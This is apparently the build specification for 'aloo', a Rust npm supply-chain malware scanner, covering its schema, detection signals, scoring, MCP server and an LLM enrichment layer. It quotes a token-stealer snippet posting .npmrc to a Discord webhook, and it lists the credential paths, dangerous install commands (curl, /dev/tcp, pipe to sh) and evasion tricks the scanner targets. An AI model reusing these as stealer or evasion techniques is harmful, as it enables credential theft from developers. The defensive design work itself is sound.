# SPEC.md

Build specification for `aloo`. This is the thing you build against. `AGENTS.md` is the behavior contract for anyone, human or agent, working in the repo; this is the technical schema, dependency set, build order, and the proof obligations per layer.

No logic here, only shapes and contracts. Type sketches use Rust-ish notation to pin the data, not to prescribe implementation.

## The pipeline

```
PackageVersion -> Analyzer -> PackageFacts -> signals -> Vec<Reason> -> score -> Verdict
```

Everything hangs off this. Lock the types before writing detection, because every component speaks them. The `Analyzer` trait is the one seam that is expensive to get wrong, so design it as if `OxcAnalyzer` already lives behind it.

## Data schema

### Input layer

```
Manifest
  name: String
  version: String
  scripts: BTreeMap<String, String>     ordered, install hooks live here
  raw: String                           original package.json text, kept for evidence

SourceFile
  path: String                          relative, normalized, forward slashes
  contents: String                      utf8, capped at MAX_FILE_BYTES

PackageVersion
  name: String
  version: String
  manifest: Manifest
  files: Vec<SourceFile>                manifest plus code files
```

`PackageVersion` exposes `lifecycle_scripts()` yielding only `preinstall`, `install`, `postinstall`, and the two loaders below.

Constants: `MAX_FILE_BYTES = 2 MiB`, code extensions `js cjs mjs ts jsx tsx`, lifecycle hooks `preinstall install postinstall`.

### Facts layer (emitted by the Analyzer)

```
SourceKind     enum: ProcessEnv EnvFile NpmToken SshKey AwsCredentials WalletData BrowserData
  sensitivity() -> Sensitivity
Sensitivity    enum: Elevated | Critical
SinkKind       enum: NetworkSend ProcessExec DynamicEval FilesystemWrite

Evidence
  file: String
  line: usize
  snippet: String                       trimmed, length-capped

SourceObs { kind: SourceKind, evidence: Evidence }
SinkObs   { kind: SinkKind,   evidence: Evidence }
FlowObs   { source: SourceKind, sink: SinkKind, evidence: Evidence }

FileFacts
  path: String
  sources: Vec<SourceObs>
  sinks: Vec<SinkObs>
  flows: Vec<FlowObs>

PackageFacts
  files: Vec<FileFacts>
  flows() -> iterator over all FlowObs
```

Sensitivity mapping: ProcessEnv, EnvFile, BrowserData are Elevated. NpmToken, SshKey, AwsCredentials, WalletData are Critical.

### Output layer (the contract agents read)

```
Severity   enum, ordered: Info Low Medium High Critical
Decision   enum: Allow Warn Block        exit_code() -> 0 | 1 | 2
ReasonCode enum:
  InstallScriptPresent DangerousInstallScript Obfuscation
  DynamicEval KnownIoc CredentialExfiltration RiskIntroducedInRelease

Reason
  code: ReasonCode
  severity: Severity
  title: String
  detail: String
  evidence: Vec<Evidence>

Verdict
  package: String
  version: String
  decision: Decision
  score: u32
  analyzer: String                       which backend produced it
  reasons: Vec<Reason>
```

`Verdict` serializes to the stable JSON below. Field names and enum variants are a public API. Renaming any of them is a breaking schema change and must be versioned.

### The boundary

```
trait Analyzer
  name(&self) -> &str
  analyze_package(&self, pkg: &PackageVersion) -> PackageFacts
```

The only component in the system that understands JavaScript. Nothing oxc-shaped may appear in this signature or in anything a signal touches.

## Verdict JSON contract

This is what the CLI emits under `--json` and what the MCP tool returns. Agents key on `decision`.

```json
{
  "package": "color-utils-pro",
  "version": "1.4.2",
  "decision": "block",
  "score": 155,
  "analyzer": "heuristic",
  "reasons": [
    {
      "code": "credential_exfiltration",
      "severity": "critical",
      "title": "npm auth token reaches the network",
      "detail": "The package reads an npm auth token and sends it to a network sink.",
      "evidence": [
        { "file": "scripts/setup.js", "line": 8, "snippet": "const t = fs.readFileSync(os.homedir()+'/.npmrc')" }
      ]
    },
    {
      "code": "known_ioc",
      "severity": "high",
      "title": "Discord webhook exfiltration endpoint",
      "detail": "Code references a Discord webhook URL, a common destination for stolen data.",
      "evidence": [
        { "file": "scripts/setup.js", "line": 9, "snippet": "post('https://discord.com/api/webhooks/...', t)" }
      ]
    },
    {
      "code": "install_script_present",
      "severity": "medium",
      "title": "postinstall script runs on install",
      "detail": "This package executes a postinstall lifecycle script.",
      "evidence": [
        { "file": "package.json", "line": 0, "snippet": "\"postinstall\": \"node scripts/setup.js\"" }
      ]
    }
  ]
}
```

## Signals

Each signal is a pure function returning `Vec<Reason>`.

| Signal | Input | Emits | Severity | Trigger |
| --- | --- | --- | --- | --- |
| `manifest` | `&PackageVersion` | InstallScriptPresent | Medium | any lifecycle hook present |
| `manifest` | `&PackageVersion` | DangerousInstallScript | High | hook body matches dangerous-command set |
| `entropy` | `&PackageVersion` | Obfuscation | Medium | base64 blob 200+, fromCharCode chain 4+, or high-entropy literal |
| `ioc` | `&PackageVersion` | KnownIoc | High | Discord webhook or Telegram bot URL |
| `ioc` | `&PackageVersion` | DynamicEval | High | eval of decoded payload |
| `taint` | `&PackageFacts` | CredentialExfiltration | Critical if source sensitivity Critical, else High | a flow from a credential source to a sink |
| `diff` | `&PackageFacts`, `&PackageFacts` | RiskIntroducedInRelease | High | flow or install script present now, absent in prior version |

`taint` is the wedge: it catches the stealer pattern that CVE matching is structurally blind to. `diff` is the account-takeover case, where age and reputation signals all say safe and only a release-to-release change reveals the problem.

Every `Reason` carries evidence. No evidence, no reason.

## Backends

Both implement `Analyzer` and emit identical `PackageFacts` shapes.

`HeuristicAnalyzer` (default, ship this). Line-scan each file with source and sink regex sets, recording line numbers. Infer a flow by co-occurrence: a file with any source and a NetworkSend produces a FlowObs per distinct source kind. Cheap, deterministic, over-approximating. The over-approximation is why benign counter-fixtures matter. `name()` is `"heuristic"`.

`OxcAnalyzer` (feature `oxc`, the swap, phase 2). Parse to AST, build the semantic model with scopes and symbols, run dataflow so a source value reaching a sink argument through assignments and calls is a flow and unrelated co-occurrence is not. Same trait, same output, so signals and scoring never change. `name()` is `"oxc"`. This replaces co-occurrence with reachability, which is the entire quality jump.

## Loaders

`from_dir(path)`. Recurse, skip `node_modules` and dotfiles, read `package.json` plus code extensions, cap file size, normalize relative paths.

`from_tarball(path)` for `.tgz`. Gzip-decode, untar, strip the `package/` prefix npm wraps everything in, read only manifest and code files under the cap.

The gotcha: the published tarball can differ from the linked git repo, and that gap has been used to ship a clean repo with a dirty tarball. Analyze the artifact you would install, never the repo.

## Scoring

Pure function over the merged reason list.

Weights: Info 0, Low 5, Medium 15, High 40, Critical 100.
Thresholds: `warn_threshold = 15`, `block_threshold = 100`.

Rules: any Critical reason forces Block. Otherwise sum the weights; at or above block is Block, at or above warn is Warn, below is Allow.

These numbers are placeholders until the corpus calibrates them. A known calibration tension to expect: an `env -> network` exfil plus a postinstall scores High plus Medium, which is 55, landing at Warn rather than Block. Whether that is correct is a corpus decision, not a guess. Do not hand-tune weights without rerunning the bench.

## Registry module (phase 1.5, not v0)

Registry metadata is high-value but needs network, so it stays out of the pure engine.

`aloo-registry` fetches npm registry JSON and produces its own `Vec<Reason>`:

- maintainer change since last version (highest-value cheap signal)
- package age (just-published is a prior)
- version velocity (dormant maintainer suddenly publishing)
- typosquat distance against the popular-name set (Damerau-Levenshtein plus homoglyph normalization)
- provenance and signature presence

The orchestrator merges these reasons with engine reasons before scoring. The engine stays deterministic and offline; the network lives here.

## Orchestration

The only place side effects exist. Load the package, optionally load the prior version for `diff`, optionally fetch registry metadata, gather all reasons, call the one scoring function, emit. CLI, MCP server, and the future backend are all thin orchestrators over the same engine.

## Bench harness

Layout:

```
crates/bench/corpus/
  benign/<name>/        package dir or tarball, expected Allow
  malicious/<name>/     package dir or tarball, expected positive
```

Label comes from the parent folder. For each fixture: load, evaluate, treat any decision other than Allow as a positive prediction, treat `malicious` as the actual positive. Compute TP, FP, FN, TN, then precision, recall, false-positive rate. Print the confusion matrix, the per-fixture decision, and an explicit list of false negatives and false positives by name. Those two lists are the only rows you act on.

Seed corpus: sanitized replays of real attacks (Shai-Hulud postinstall worm and token exfil, the nx credential harvest, the axios backdoor), each on inert endpoints, each must Block. Benign set includes at least one package that legitimately calls the network, because that is the false-positive case that decides whether anyone keeps aloo installed.

The gate: a recall floor on the malicious set and an FPR ceiling on the benign set, asserted in a test, CI red on regression.

## MCP server

stdio transport, newline-delimited JSON-RPC 2.0, one object per line, no embedded newlines.

Methods: `initialize` returns protocol version, server info, and tools capability. `notifications/initialized` is ignored. `tools/list` advertises one tool. `tools/call` runs it. `ping` returns empty.

Tool `vet_package`: input is a path to a directory or tarball in v0, output is the `Verdict` as structured content plus a text rendering. Malformed input returns a JSON-RPC error, never a panic. Synchronous for v0. Move to `rmcp` and `tokio` only when you want an HTTP transport and concurrency.

## CLI

```
aloo vet <path> [--json] [--against <prior-path>]
```

Human-readable table by default, the Verdict JSON contract under `--json`, exit code equal to the decision so it drops into a shell gate or a pre-exec hook. `--against` feeds the `diff` signal with a prior version.

## Dependencies

Per crate, with what to refuse.

| Crate | Use | Refuse |
| --- | --- | --- |
| `aloo-engine` | serde, serde_json, regex, thiserror, flate2, tar | any async runtime, any HTTP client, any model SDK |
| `aloo-engine` feature `oxc` | oxc_allocator, oxc_parser, oxc_ast, oxc_semantic | enabling it in default builds |
| `aloo-bench` | aloo-engine, serde_json, walkdir; insta optional | network of any kind in fixtures |
| `aloo-mcp` | aloo-engine, serde, serde_json, std stdin loop | rmcp and tokio until HTTP transport is needed |
| `aloo` (cli) | aloo-engine, serde_json, std args; clap when help is wanted | heavy arg frameworks in v0 |
| `aloo-registry` (1.5) | ureq, strsim | async, since the rest is sync |

Dev-deps for validation: insta (snapshots), proptest (determinism and properties), criterion (throughput, later).

The engine refusing async, HTTP, and clocks is not stylistic. Their absence is what makes determinism enforceable.

## Build order

1. Types: input, facts, output, config, the `Analyzer` trait. Lock the contract.
2. `HeuristicAnalyzer`, enough to emit facts.
3. The five signals plus scoring.
4. Loaders, directory first then tarball.
5. Bench harness and a starter corpus, three or four malicious patterns and two or three benign including one that legitimately calls the network. First number here.
6. CLI, to vet real packages by hand.
7. MCP server, so an agent can call it.
8. Calibrate thresholds against the corpus, add the real-attack replays.
9. Phase 1.5 registry metadata. Phase 2 the oxc swap and the sandboxed dynamic tier.

## Validation matrix

| Layer | Must prove | How |
| --- | --- | --- |
| Types | verdict round-trips to the documented JSON; field and variant names are guarded | serde round-trip test plus an insta snapshot |
| Each signal | a crafted positive yields the exact code, severity, and evidence; a negative yields nothing | per-signal unit tests, both directions |
| Flow inference | env plus fetch yields a flow; env alone yields nothing; fetch alone yields nothing | targeted facts tests, the fetch-alone case is the false-positive story |
| Loaders | a dir and its tarball parse to the same files; `package/` stripped; size cap holds; node_modules skipped | fixture pair, byte compare |
| Determinism | same package evaluates to byte-identical JSON; shuffled input order yields identical output | repeat-eval test, shuffle test, plus the engine not compiling with clock, RNG, or socket in reach |
| Scoring | reason sets map to expected decisions; any-critical-blocks; exact threshold boundaries | table-driven test |
| Bench gate | recall at or above floor on malicious; FPR at or below ceiling on benign | assertion in CI, red on regression |
| MCP | initialize handshake valid; tools/list shape correct; tools/call returns a verdict; bad input is a JSON-RPC error | protocol conformance tests |

## Adversarial blind-spot inventory

Hand the heuristic backend the cases it misses on purpose, and log every miss. This list is both your blind-spot inventory and the concrete justification for the oxc swap. Being able to name your false negatives is part of what makes the quality claim real.

- a source assigned to a variable before it is sent, so co-occurrence still catches it but real dataflow is needed to be sure it is the same value
- a sink name assembled by string concatenation, so the regex never sees `fetch`
- the exfil URL stored as base64 and decoded at runtime
- computed property access instead of a literal, `process['e'+'nv']`
- a flow split across two files via a re-exported helper
- a payload fetched at runtime so nothing malicious is in the published tarball at all, which only the dynamic tier can catch

The first five are the oxc case. The last is the sandbox case. Both are phase 2, and both should be named in the corpus as known misses before then, not discovered later.

## Detection vocabulary (heuristic backend reference)

The pattern intent for the regex sets. Tune against the corpus; these are the starting vocabulary.

Sources: `process.env`; `.npmrc`, `NPM_TOKEN`, `_authToken`; `.ssh/`, `id_rsa`; `.aws/credentials`, `AWS_SECRET_ACCESS_KEY`; `.env` file reads; `wallet.dat`, `keystore`, `MetaMask`; browser `Login Data`, `Cookies`, `leveldb`.

Sinks: `fetch(`, `http(s).request`, `axios`, `net.connect`, `WebSocket(`, `.post(`, `dns.` for NetworkSend; `child_process`, `execSync`, `exec(`, `spawn(`, `execFile` for ProcessExec; `eval(`, `new Function(`, `vm.runIn` for DynamicEval; `writeFileSync`, `createWriteStream` for FilesystemWrite.

IoC: `https://discord(app).com/api/webhooks/`; `https://api.telegram.org/bot`; `eval( atob( | Buffer.from( | unescape(`.

Dangerous install commands: `curl`, `wget`, `node -e`, `base64 -d`, `child_process`, `/dev/tcp`, pipe to `sh`, `powershell`, `bash -c`.

All regex sets avoid lookaround, since the `regex` crate does not support it.

## Intelligence layer

The deterministic pipeline detects. The intelligence layer explains and contextualizes what was already found. These are different jobs running in different tiers. The separation is not cosmetic; it is what keeps aloo honest.

The realtime path is never touched. A deterministic `Verdict` is issued in milliseconds. An agent or shell gate acts on `decision` immediately. The intelligence layer runs as a background batch job afterward, enriching the verdict for the human who reviews the decision. When enrichment is ready it is stored and served on demand. It is never in the critical path.

### What the intelligence layer does

Four jobs, each grounded in the deterministic evidence list. The model receives the structured verdict, not the raw source files. It is not doing detection. It is reading a finding and generating analysis.

**Narrative analysis.** A plain-English explanation of what the code is doing and why it is dangerous. Not "credential_exfiltration, severity critical" but a specific description of the attack: what was read, where it was sent, what the attacker gains, which known campaign family the pattern belongs to.

**False positive analysis.** For any Warn, and for any Block on a package with plausibly legitimate network use, evaluate whether the pattern looks like a real attack or a false positive, and state a confidence level. This is the job that earns trust. A developer who gets a wrong Block and a coherent explanation of why it was a false positive will trust the tool. A developer who gets a wrong Block and only a reason code will override it and turn the tool off.

**Campaign correlation.** Given the IoCs in the evidence (exfil endpoint, obfuscation pattern, install-script structure), identify structural similarities to known malware campaigns in the corpus. Ground this in the corpus, not in the model's training data, by passing campaign examples as RAG context or few-shot examples.

**Remediation.** Given the verdict and evidence, what specifically should the developer do: pin to a safe version, rotate a token, file a report. Not generic advice. Specific to this package and this finding.

### What the intelligence layer must not do

It must not change the verdict decision. `decision` in the original `Verdict` is immutable once issued. The model may assess false-positive likelihood, but it cannot upgrade a Warn to a Block or downgrade a Block to an Allow. The `EnrichedVerdict` carries the original `Verdict` alongside the enrichment. The `decision` field agents key on is always the deterministic one.

It must not explain findings that do not exist. The model receives only the evidence the pipeline produced. It does not receive raw source and a question like "is this malicious." That framing makes it a detector, which is the wrong job and the gameable one.

It must not be trusted as a gate. Enrichment is for humans reviewing decisions, not for blocking or allowing installs. Any use of `Enrichment` to make a security decision is an architecture violation.

### Schema

```
AnalysisConfidence  enum: High | Medium | Low

EnrichmentStatus    enum: Pending | Complete | Failed

NarrativeAnalysis
  summary: String               two or three sentences, what the code does and what it achieves
  attack_type: String           human name for the pattern, e.g. "npm token stealer"
  severity_rationale: String    why this severity and not higher or lower
  confidence: AnalysisConfidence

FalsePositiveAnalysis
  likely_fp: bool
  rationale: String             specific reason, naming the legitimate use case if applicable
  confidence: AnalysisConfidence

CampaignCorrelation
  matched: bool
  campaign_name: Option<String>
  similarity_basis: String      what matched: endpoint, obfuscation pattern, script structure
  reference_count: usize        how many corpus packages share this pattern

Remediation
  action: String                the specific thing to do right now
  pin_to: Option<String>        a specific safe version if known
  report_url: Option<String>    where to file a report

Enrichment
  status: EnrichmentStatus
  narrative: Option<NarrativeAnalysis>
  false_positive: Option<FalsePositiveAnalysis>
  campaign: Option<CampaignCorrelation>
  remediation: Option<Remediation>
  model: String                 which model produced this, for auditability and reprocessing
  generated_at: DateTime<Utc>

EnrichedVerdict
  verdict: Verdict              the original, immutable
  enrichment: Enrichment
```

`EnrichedVerdict` serializes to a superset of the `Verdict` JSON. The `verdict` field is the complete original object. `enrichment` is alongside it, never nested inside it.

### Enrichment JSON contract

```json
{
  "verdict": { ...the full Verdict object, unchanged... },
  "enrichment": {
    "status": "complete",
    "narrative": {
      "summary": "This package reads the npm auth token from the user's .npmrc file in a postinstall script and exfiltrates it to a Discord webhook. The attacker gains publish rights to every package the victim owns.",
      "attack_type": "npm token stealer via postinstall",
      "severity_rationale": "Direct credential exfiltration with immediate account-takeover consequence. The attack runs automatically on install with no user interaction required.",
      "confidence": "high"
    },
    "false_positive": {
      "likely_fp": false,
      "rationale": "The .npmrc read and the Discord webhook send are on adjacent lines with no intervening logic. There is no plausible legitimate use for sending an npm token to a Discord webhook.",
      "confidence": "high"
    },
    "campaign": {
      "matched": true,
      "campaign_name": "Shai-Hulud",
      "similarity_basis": "Discord webhook endpoint format and .npmrc extraction path match 23 packages in the Shai-Hulud 2.0 wave",
      "reference_count": 23
    },
    "remediation": {
      "action": "Do not install this package. If it was already installed, rotate your npm token immediately at npmjs.com/settings/tokens and audit your published packages for unauthorized releases.",
      "pin_to": null,
      "report_url": "https://npmjs.com/advisories/report"
    },
    "model": "claude-sonnet-4-6",
    "generated_at": "2026-06-24T11:30:00Z"
  }
}
```

### Prompt contract

The model receives structured input only. No raw source files.

System prompt encodes:
- the four jobs and their expected output shapes
- the hard constraint: the model may not change `decision`, may not suggest the decision is wrong, and may only assess false-positive likelihood in the `false_positive` field
- instruction to ground campaign correlation in the provided corpus examples, not training data
- instruction to keep narrative factual and evidence-grounded, no hedging language

User message contains:
- the package name and version
- the `decision` and `score`
- the full `reasons` array with evidence snippets
- campaign corpus examples as context (few-shot or RAG), relevant to the IoCs present

The model must return valid JSON matching the enrichment fields. Ask for JSON mode or structured output where the model API supports it. Parse and validate before storing.

### Batch job design

```
Queue entry
  package: String
  version: String
  verdict: Verdict          the full deterministic verdict JSON
  enqueued_at: DateTime<Utc>

Worker
  pull entry from queue
  call model with structured prompt
  validate response shape
  write Enrichment to store, keyed by (package, version)
  mark status Complete or Failed
  on model error: retry with exponential backoff, cap at three attempts, then Failed
```

Trigger: any verdict with `decision` of Warn or Block is enqueued automatically. Allow verdicts are not enriched by default. Enrichment on demand for Allow is a future capability if a developer asks for it.

Idempotent: running the job twice on the same (package, version) overwrites the enrichment. The model name and timestamp are stored with every result so the full corpus can be retroactively re-enriched when a better model becomes available.

The queue is a Postgres table in phase 2. A `SELECT ... FOR UPDATE SKIP LOCKED` worker is enough for this volume. No separate queue infrastructure.

### Dependencies (intelligence layer crate, phase 2)

`aloo-intelligence` depends on `aloo-engine` for types only. It imports `Verdict` and `EnrichedVerdict`. It never imports detection logic, signals, or the `Analyzer` trait.

| Dep | Use |
| --- | --- |
| tokio | async worker loop and retry logic |
| reqwest | model API calls |
| serde, serde_json | prompt and response handling |
| sqlx | queue and enrichment store |
| chrono | timestamps |

This is the one crate where async is correct, because the work is waiting on a model API.

### Validation

| Must prove | How |
| --- | --- |
| The `verdict` field in `EnrichedVerdict` is byte-identical to the original `Verdict` | round-trip test |
| The model's response is parsed and validated before storage; invalid JSON or wrong shape produces `Failed` status, not a panic | schema validation test with a malformed mock response |
| `EnrichmentStatus` of `Pending` is never served as `Complete` | state machine test |
| Re-enriching the same package-version overwrites cleanly with no duplicates | idempotency test |
| `decision` in the stored `verdict` is never modified by the enrichment worker | invariant test comparing stored verdict to the original before and after enrichment |

### Build order position

After step 8 in the main build order: after the bench gate has a real number and the thresholds are calibrated. The deterministic pipeline must be solid before the intelligence layer explains its findings. Enrichment on a flaky pipeline trains users to distrust both layers.

This is also the component you demo last. The demo sequence is: drop in a known-bad package, show the Block with the deterministic reason list (proves correctness), then show the narrative analysis (proves legibility). The second half is what gets shared. The first half is what makes the second half trustworthy.